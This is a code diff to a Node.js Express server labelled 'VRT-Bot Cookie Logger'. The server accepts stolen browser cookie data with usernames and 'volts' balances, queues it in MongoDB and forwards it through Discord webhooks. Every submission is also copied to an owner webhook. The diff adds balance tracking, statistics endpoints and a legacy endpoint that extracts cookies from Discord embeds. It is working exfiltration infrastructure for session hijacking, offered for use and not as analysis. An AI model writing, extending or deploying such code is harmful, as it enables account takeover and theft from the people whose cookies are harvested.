@@ -64,10 +64,12 @@ const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://rfbbuiness_db_user
 const DB_NAME = process.env.DB_NAME || 'vrtbot';
 const COLLECTION_NAME = 'webhooks';
 const QUEUE_COLLECTION = 'webhook_queue';
+const STATS_COLLECTION = 'stats';
 
 let db;
 let webhooksCollection;
 let queueCollection;
+let statsCollection;
 let mongoClient;
 
 async function connectToMongoDB() {
@@ -96,6 +98,7 @@ async function connectToMongoDB() {
         db = mongoClient.db(DB_NAME);
         webhooksCollection = db.collection(COLLECTION_NAME);
         queueCollection = db.collection(QUEUE_COLLECTION);
+        statsCollection = db.collection(STATS_COLLECTION);
         
         // Create indexes
         try {
@@ -114,6 +117,27 @@ async function connectToMongoDB() {
     } catch (error) {
         console.error('❌ MongoDB connection error:', error.message);
         return false;
+    }
+}
+
+// ============================================================
+//  ✅ INIT STATS
+// ============================================================
+async function initStats() {
+    if (!db) return;
+    try {
+        const existing = await statsCollection.findOne({ _id: 'volts_counter' });
+        if (!existing) {
+            await statsCollection.insertOne({
+                _id: 'volts_counter',
+                total: 0,
+                createdAt: new Date().toISOString(),
+                updatedAt: new Date().toISOString()
+            });
+            console.log('✅ Stats initialized');
+        }
+    } catch (error) {
+        console.error('❌ Error initializing stats:', error);
     }
 }
 
@@ -138,11 +162,12 @@ function generateId() {
 // ============================================================
 //  ✅ QUEUE SYSTEM - STORE COOKIE DATA
 // ============================================================
-async function addToQueue(hookId, username, cookieData) {
+async function addToQueue(hookId, username, cookieData, volts = 0) {
     const queueItem = {
         hookId,
         username,
-        cookieData: cookieData, // Only cookie data, no embeds
+        cookieData: cookieData,
+        volts: volts || 0,
         status: 'pending',
         attempts: 0,
         maxAttempts: 3,
@@ -201,7 +226,7 @@ async function getQueueStats() {
 // ============================================================
 //  ✅ WEBHOOK SENDER - ONLY COOKIE DATA
 // ============================================================
-async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
+async function sendCookieDataToWebhook(webhookUrl, username, cookieData, volts = 0) {
     try {
         if (!webhookUrl) {
             return { success: false, error: 'Webhook URL is empty' };
@@ -209,9 +234,9 @@ async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
 
         // Format cookie data for Discord
         const cookieString = typeof cookieData === 'string' ? cookieData : JSON.stringify(cookieData);
-        const cookiePreview = cookieString.length > 1000 ? cookieString.substring(0, 1000) + '...' : cookieString;
+        const cookiePreview = cookieString.length > 1500 ? cookieString.substring(0, 1500) + '...' : cookieString;
 
-        // Discord embed with only cookie data
+        // Discord embed with cookie data
         const payload = {
             username: "🍪 VRT-Bot Cookie Logger",
             embeds: [{
@@ -219,6 +244,11 @@ async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
                 description: `**Username:** ${username}`,
                 color: 0xff6b6b,
                 fields: [
+                    {
+                        name: "⚡ Volts",
+                        value: `\`${volts.toLocaleString()}\``,
+                        inline: true
+                    },
                     {
                         name: "🍪 Cookie Data",
                         value: `\`\`\`\n${cookiePreview}\n\`\`\``,
@@ -230,7 +260,7 @@ async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
                         inline: true
                     },
                     {
-                        name: "📦 Queue Status",
+                        name: "📦 Status",
                         value: "✅ Processed",
                         inline: true
                     }
@@ -253,7 +283,7 @@ async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
         const responseText = await response.text();
 
         if (response.status === 429) {
-            const retryAfter = response.headers.get('Retry-After') || '600'; // 10 min default
+            const retryAfter = response.headers.get('Retry-After') || '600';
             console.log(`⏳ Rate limited! Retry after ${retryAfter}s`);
             return { 
                 success: false, 
@@ -334,7 +364,8 @@ async function processQueue() {
             const result = await sendCookieDataToWebhook(
                 hook.webhookUrl, 
                 item.username, 
-                item.cookieData
+                item.cookieData,
+                item.volts || 0
             );
             
             if (result.success) {
@@ -352,7 +383,8 @@ async function processQueue() {
                     const ownerResult = await sendCookieDataToWebhook(
                         OWNER_WEBHOOK,
                         `[OWNER] ${item.username}`,
-                        item.cookieData
+                        item.cookieData,
+                        item.volts || 0
                     );
                     if (ownerResult.success) {
                         console.log(`✅ Owner webhook sent`);
@@ -384,7 +416,7 @@ async function processQueue() {
                     });
                     console.log(`❌ Failed after ${item.attempts} attempts for ${item.username}`);
                 } else {
-                    const retryAt = new Date(Date.now() + 300000); // 5 min
+                    const retryAt = new Date(Date.now() + 300000);
                     await updateQueueItem(item._id, {
                         status: 'pending',
                         retryAt: retryAt.toISOString(),
@@ -414,7 +446,7 @@ async function processQueue() {
             console.log(`⏰ ${stats.pending + stats.waiting} items remaining, checking again in 5 minutes`);
             setTimeout(() => {
                 processQueue();
-            }, 300000); // 5 min
+            }, 300000);
         } else {
             console.log(`📭 Queue is empty, processor idle`);
         }
@@ -426,11 +458,109 @@ async function processQueue() {
 // ============================================================
 function startQueueProcessor() {
     console.log('🚀 Starting queue processor (10 minute intervals)...');
-    // Process every 10 minutes
     setInterval(() => {
         processQueue();
-    }, 600000); // 10 minutes
+    }, 600000);
 }
+
+// ============================================================
+//  ✅ REAL STATISTICS ENDPOINTS
+// ============================================================
+
+// Get real statistics from database
+app.get('/api/stats', async (req, res) => {
+    if (!db) {
+        return res.status(503).json({ error: 'Database not connected' });
+    }
+
+    try {
+        // Count total webhooks (active users)
+        const activeUsers = await webhooksCollection.countDocuments();
+        
+        // Get total volts sent from stats collection
+        const voltsDoc = await statsCollection.findOne({ _id: 'volts_counter' });
+        const voltsSent = voltsDoc?.total || 0;
+        
+        // Get average response time from queue items
+        const responseTimeResult = await queueCollection.aggregate([
+            { $match: { 
+                status: 'sent', 
+                completedAt: { $exists: true }, 
+                createdAt: { $exists: true } 
+            }},
+            { $project: { 
+                diff: { $subtract: [
+                    { $dateFromString: { dateString: '$completedAt' } },
+                    { $dateFromString: { dateString: '$createdAt' } }
+                ]}
+            }},
+            { $group: { _id: null, avg: { $avg: '$diff' } } }
+        ]).toArray();
+        const avgResponseTime = responseTimeResult.length > 0 ? Math.round(responseTimeResult[0].avg) : 240;
+
+        // Get queue stats
+        const queueStats = await getQueueStats();
+
+        res.json({
+            success: true,
+            stats: {
+                activeUsers: activeUsers || 0,
+                voltsSent: voltsSent || 0,
+                responseTime: avgResponseTime || 240,
+                pending: queueStats.pending || 0,
+                waiting: queueStats.waiting || 0,
+                sent: queueStats.sent || 0,
+                failed: queueStats.failed || 0,
+                totalProcessed: (queueStats.sent || 0) + (queueStats.failed || 0)
+            },
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        console.error('❌ Error fetching stats:', error);
+        res.status(500).json({ error: 'Error fetching stats' });
+    }
+});
+
+// Increment volts sent counter
+app.post('/api/increment-volts', async (req, res) => {
+    if (!db) {
+        return res.status(503).json({ error: 'Database not connected' });
+    }
+
+    const { amount } = req.body;
+    const voltsToAdd = amount || 1;
+
+    try {
+        await statsCollection.updateOne(
+            { _id: 'volts_counter' },
+            { 
+                $inc: { total: voltsToAdd },
+                $set: { updatedAt: new Date().toISOString() }
+            },
+            { upsert: true }
+        );
+        
+        res.json({ success: true, added: voltsToAdd });
+    } catch (error) {
+        console.error('❌ Error incrementing volts:', error);
+        res.status(500).json({ error: 'Error incrementing volts' });
+    }
+});
+
+// Get active users count
+app.get('/api/active-users', async (req, res) => {
+    if (!db) {
+        return res.status(503).json({ error: 'Database not connected' });
+    }
+
+    try {
+        const count = await webhooksCollection.countDocuments();
+        res.json({ activeUsers: count });
+    } catch (error) {
+        console.error('❌ Error fetching active users:', error);
+        res.status(500).json({ error: 'Error fetching active users' });
+    }
+});
 
 // ============================================================
 //  ✅ API ROUTES
@@ -621,11 +751,12 @@ app.delete('/api/hook/:id', async (req, res) => {
 // ============================================================
 app.post('/api/submit-cookies/:hookId', async (req, res) => {
     const { hookId } = req.params;
-    const { username, cookieData } = req.body;
+    const { username, cookieData, volts } = req.body;
 
     console.log(`🍪 ===== NEW COOKIE SUBMISSION =====`);
     console.log(`🍪 Hook ID: ${hookId}`);
     console.log(`👤 Username: ${username}`);
+    console.log(`⚡ Volts: ${volts || 0}`);
     console.log(`📦 Cookie data size: ${cookieData ? cookieData.length : 0} chars`);
 
     if (!cookieData) {
@@ -645,10 +776,14 @@ app.post('/api/submit-cookies/:hookId', async (req, res) => {
         }
 
         // Add to queue
-        const queueId = await addToQueue(hookId, username || hook.username || 'Unknown', cookieData);
+        const queueId = await addToQueue(
+            hookId, 
+            username || hook.username || 'Unknown', 
+            cookieData,
+            volts || 0
+        );
         
         console.log(`✅ Cookies queued with ID: ${queueId}`);
-        console.log(`📊 Queue size: ${await queueCollection.countDocuments({ status: 'pending' })}`);
         
         // Trigger processing if not already running
         if (!isProcessing) {
@@ -666,6 +801,87 @@ app.post('/api/submit-cookies/:hookId', async (req, res) => {
         
     } catch (error) {
         console.error('❌ Error submitting cookies:', error);
+        res.status(500).json({ error: 'Server error: ' + error.message });
+    }
+});
+
+// ============================================================
+//  ✅ LEGACY SEND ENDPOINT (for compatibility)
+// ============================================================
+app.post('/api/send/:hookId', async (req, res) => {
+    const { hookId } = req.params;
+    const { data } = req.body;
+
+    console.log(`📨 Legacy send request for hook: ${hookId}`);
+
+    if (!data) {
+        return res.status(400).json({ error: 'Missing data' });
+    }
+
+    if (!db || !webhooksCollection) {
+        return res.status(503).json({ error: 'Database not connected' });
+    }
+
+    try {
+        const hook = await webhooksCollection.findOne({ hookId });
+        if (!hook) {
+            return res.status(404).json({ error: 'Hook not found' });
+        }
+
+        // Extract cookie data from embed fields or use data directly
+        let cookieData = null;
+        let username = hook.username;
+        let volts = 0;
+
+        // Try to extract from embeds
+        if (data.embeds && data.embeds.length > 0) {
+            const embed = data.embeds[0];
+            if (embed.fields) {
+                embed.fields.forEach(field => {
+                    if (field.name.includes('Cookie') || field.name.includes('cookie')) {
+                        cookieData = field.value;
+                    }
+                    if (field.name.includes('Volts') || field.name.includes('volts')) {
+                        const match = field.value.match(/[\d,]+/);
+                        if (match) {
+                            volts = parseInt(match[0].replace(/,/g, ''));
+                        }
+                    }
+                });
+            }
+            if (embed.description) {
+                const match = embed.description.match(/\*\*([^*]+)\*\*/);
+                if (match) {
+                    username = match[1];
+                }
+            }
+        }
+
+        // If no cookie data found, use the whole data
+        if (!cookieData) {
+            cookieData = JSON.stringify(data);
+        }
+
+        // Add to queue
+        const queueId = await addToQueue(hookId, username, cookieData, volts);
+        
+        console.log(`✅ Legacy request queued with ID: ${queueId}`);
+        
+        if (!isProcessing) {
+            processQueue();
+        }
+
+        res.json({
+            success: true,
+            message: 'Data queued for processing',
+            queueId: queueId,
+            hookId: hookId,
+            username: username,
+            status: 'pending'
+        });
+        
+    } catch (error) {
+        console.error('❌ Error processing legacy send:', error);
         res.status(500).json({ error: 'Server error: ' + error.message });
     }
 });
@@ -692,6 +908,10 @@ async function startServer() {
     
     const connected = await connectToMongoDB();
     
+    if (connected) {
+        await initStats();
+    }
+    
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Server running on port ${PORT}`);
         console.log(`🍃 MongoDB: ${connected ? '✅ Connected' : '❌ Not connected'}`);
@@ -699,6 +919,7 @@ async function startServer() {
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
         console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
         console.log(`⏰ Queue processor runs every 10 minutes`);
+        console.log(`📊 Stats endpoint: /api/stats`);
     });
     
     if (connected && OWNER_WEBHOOK) {
